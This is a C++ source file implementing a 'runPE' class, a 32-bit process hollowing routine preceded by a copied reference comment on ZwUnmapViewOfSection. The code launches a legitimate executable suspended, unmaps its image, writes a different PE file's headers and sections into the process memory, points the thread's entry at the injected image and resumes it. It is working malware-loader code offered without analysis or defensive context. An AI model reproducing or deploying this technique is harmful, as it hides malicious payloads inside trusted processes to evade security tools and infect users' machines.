	typedef LONG ( WINAPI   *NtUnmapViewOfSection) ( HANDLE ProcessHandle, PVOID BaseAddress );
//	typedef LONG (__stdcall *NtUnmapViewOfSection) ( HANDLE ProcessHandle, PVOID BaseAddress );

/*	The ZwUnmapViewOfSection routine unmaps a view of a section from the virtual address space of a subject process.

	SYNTAX:
	NTSTATUS ZwUnmapViewOfSection(  _In_     HANDLE ProcessHandle,
					_In_opt_ PVOID  BaseAddress	);

	PARAMETERS:
	ProcessHandle [in]			Handle to a process object that was previously passed to ZwMapViewOfSection.

	BaseAddress [in, optional]		Pointer to the base virtual address of the view to unmap. 
						This value can be any virtual address within the view.

	RETURN VALUE:				ZwUnmapViewOfSection returns an NTSTATUS value. 
	STATUS_SUCCESS				The routine successfully performed the requested operation.
	STATUS_ACCESS_DENIED			The caller does not have access rights to the process object or to the base virtual address of the view.
 
	REMARKS:				This routine unmaps the entire view of the section that contains BaseAddress from the virtual address space 
						of the specified process—even if BaseAddress does not point to the beginning of the view.
									
						On return from ZwUnmapViewOfSection, the virtual-address region occupied by the view is no longer reserved 
						and is available to map other views or private pages. If the view was also the last reference to the 
						underlying section, all committed pages in the section are decommitted, and the section is deleted.
									
	NOTE: 					If the call to this function occurs in user mode, you should use the name "NtUnmapViewOfSection" 
						instead of "ZwUnmapViewOfSection". */

	class runPE
	{
		public:		
		
		void run ( LPSTR szFilePath, PVOID pFile )	// Declares public void function "run"
		{
		
		PIMAGE_DOS_HEADER IDH;				// DOS .EXE header
		PIMAGE_NT_HEADERS INH;				// NT .EXE header
		PIMAGE_SECTION_HEADER ISH;			// Section Header
		PROCESS_INFORMATION PI;    			// Process Information
		STARTUPINFOA SI;           			// Start Up Information
		PCONTEXT CTX;              			// Context Frame
		PDWORD dwImageBase;        			
		NtUnmapViewOfSection xNtUnmapViewOfSection;
		LPVOID pImageBase;         
		int Count;
		
		IDH = PIMAGE_DOS_HEADER(pFile);
		
			if (IDH->e_magic == IMAGE_DOS_SIGNATURE)
			{
			INH = PIMAGE_NT_HEADERS(DWORD(pFile) + IDH->e_lfanew);
		
				if (INH->Signature == IMAGE_NT_SIGNATURE)
				{
				RtlZeroMemory(&SI, sizeof(SI));
				RtlZeroMemory(&PI, sizeof(PI));
			
					if (CreateProcessA(szFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
					{
					CTX = PCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
					CTX->ContextFlags = CONTEXT_FULL;
				
						if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
						{
						ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&dwImageBase), 4, NULL);
					
							if (DWORD(dwImageBase) == INH->OptionalHeader.ImageBase)
							{
							xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
							xNtUnmapViewOfSection(PI.hProcess, PVOID(dwImageBase));
							}
						
						pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(INH->OptionalHeader.ImageBase), INH->OptionalHeader.SizeOfImage, 0x3000, PAGE_EXECUTE_READWRITE);
						
							if (pImageBase)
							{
							WriteProcessMemory(PI.hProcess, pImageBase, pFile, INH->OptionalHeader.SizeOfHeaders, NULL);
							
							for (Count = 0; Count < INH->FileHeader.NumberOfSections; Count++)
							{
								ISH = PIMAGE_SECTION_HEADER(DWORD(pFile) + IDH->e_lfanew + 248 + (Count * 40));
								WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + ISH->VirtualAddress), LPVOID(DWORD(pFile) + ISH->PointerToRawData), ISH->SizeOfRawData, NULL);
							}
						
							WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8), LPVOID(&INH->OptionalHeader.ImageBase), 4, NULL);
							CTX->Eax = DWORD(pImageBase) + INH->OptionalHeader.AddressOfEntryPoint;
							SetThreadContext(PI.hThread, LPCONTEXT(CTX));
							ResumeThread(PI.hThread);
						
							}
						}
					}
				}
			}
		VirtualFree(pFile, 0, MEM_RELEASE);
		}
	};
